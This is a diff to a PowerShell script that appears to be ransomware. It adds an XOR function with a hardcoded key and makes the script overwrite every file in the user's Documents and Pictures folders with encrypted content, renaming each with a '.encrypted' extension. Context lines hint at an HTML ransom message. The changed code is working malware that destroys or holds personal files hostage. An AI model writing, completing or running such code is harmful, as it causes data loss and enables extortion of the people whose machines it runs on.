@@ -51,6 +51,35 @@ body {
 </html>
 "@
 
+# taken from https://gist.github.com/gabemarshall/f25afd533b341e1b21bc39f8e26946b7
+
+function Xor {
+    param($in, $method)
+    $key = [System.Text.Encoding]::UTF8.GetBytes("supersecretencryptionkey")
+
+    if ($method -eq "decrypt"){
+        $in = [System.Convert]::FromBase64String($in)
+    }
+
+    $out = $(for ($i = 0; $i -lt $in.length; ) {
+        for ($j = 0; $j -lt $key.length; $j++) {
+            $in[$i] -bxor $key[$j]
+            $i++
+            if ($i -ge $in.Length) {
+                $j = $key.length
+            }
+        }
+    })
+
+    if ($method -eq "encrypt") {
+        $out = [System.Convert]::ToBase64String($out)
+    } else {
+        $out = [System.Text.Encoding]::UTF8.GetBytes($out)
+    }
+    
+    return $out
+}
+
 $documentsPath = [Environment]::GetFolderPath("MyDocuments")
 $picturesPath = [Environment]::GetFolderPath("MyPictures")
 
@@ -61,8 +90,10 @@ $files = $documents + $pictures
 foreach ($file in $files) {
     $filepath = $file.FullName
     $filename = $file.Name
-    Set-Content -Path $filepath -Value "encrypted!!!"
-    Rename-Item -Path $filepath -NewName "$filename.encrypted"
+    $filecontent = Get-Content -Path $filepath -AsByteStream -Raw
+    $encrypted = Xor $filecontent "encrypt"
+    Set-Content -Path $filepath -AsByteStream -Value $encrypted
+    Rename-Item -Path $filepath -NewName "$filename.encrypted"   
 }
 
 $desktopPath = [Environment]::GetFolderPath("Desktop")
